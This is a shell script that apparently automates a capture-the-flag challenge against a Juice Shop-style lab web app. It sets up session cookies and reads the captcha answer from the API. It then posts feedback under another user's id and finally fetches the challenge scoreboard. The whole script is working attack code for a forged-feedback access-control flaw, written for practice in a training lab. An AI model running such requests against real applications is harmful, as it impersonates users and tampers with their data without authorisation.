#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.216.153"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

# Initiate session and cookies
echo "3.0 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -L > /dev/null
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "$result_folder/3-cookies.txt" -L
IO=$(grep io "$result_folder/3-cookies.txt" | awk '{print $7}')
echo "--> Session initiated with cookie IO ${IO}"
sed -i 's/#HttpOnly_//g' "$result_folder/3-cookies.txt"
sed -i 's/\t0\t/\t-1\t/g' "$result_folder/3-cookies.txt"
echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\tlanguage\ten" >> $result_folder/3-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t-1\tcookieconsent_status\tdismiss" >> $result_folder/3-cookies.txt


# Give a feedback as another user
echo "3.9 - FORGED FEEDBACK"
curl -s -X GET http://$target_ip/rest/user/whoami -b "$result_folder/1-bjoern-cookies.txt" -L -o $result_folder/1-user.json
USER_ID=$(jq -r '.user.id' $result_folder/1-user.json)
echo "--> The user id is $USER_ID"
curl -s -X GET http://$target_ip/rest/captcha -b "$result_folder/1-bjoern-cookies.txt" -L -o $result_folder/1-captcha.json
CAPTCHA_RESULT=$(jq -r '.answer' $result_folder/1-captcha.json)
CAPTCHA_ID=$(jq -r '.captchaId' $result_folder/1-captcha.json)
echo "--> The captcha $CAPTCHA_ID is $CAPTCHA_RESULT"
curl -s -X POST "http://$target_ip/api/Feedbacks/" -b "$result_folder/1-bjoern-cookies.txt" -L -H "Content-Type: application/json" -d "{\"UserId\":$USER_ID,\"captchaId\":$CAPTCHA_ID,\"captcha\":\"$CAPTCHA_RESULT\",\"comment\":\"mwahaha\",\"rating\":0}"

# Compute score
echo "3.X - COMPUTE SCORE"
curl -s -X GET http://$target_ip/api/Challenges/?sort=name -b "$result_folder/3-cookies.txt" -L -o $result_folder/3-scores.json